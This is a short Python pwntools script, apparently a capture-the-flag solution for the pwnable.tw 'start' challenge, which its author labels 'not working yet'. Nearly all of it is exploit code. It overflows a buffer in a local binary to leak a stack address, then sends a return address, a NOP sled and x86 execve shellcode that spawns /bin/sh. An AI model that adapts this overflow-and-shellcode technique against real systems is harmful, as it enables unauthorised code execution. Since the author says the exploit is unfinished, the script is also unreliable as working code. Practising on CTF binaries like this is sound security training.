from pwn import *
import sys
import struct

# pwnable.tw > start (not working yet)

shellcode=b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

# Stage 1 leak stack address

payload = "A"*20 + "\x87\x80\x04\x08" # mov ecx,esp

p = process("./start")
#Let's start the CTF:
print(p.recv(20))

p.sendline(payload)
retaddr = p.recv(4)

retaddr = struct.unpack("<I", retaddr)[0];

# Stage 2 shellcode

offset = int(sys.argv[1])
print("retaddr",hex(retaddr))
retaddr += offset
print("retaddr", hex(retaddr))

retaddr = struct.pack("<I", retaddr)

payload = b"A"*20 + retaddr + b"\x90" * 15 + shellcode

sys.stdout.buffer.write(payload)
p.sendline(payload)
print(p.recv(20));
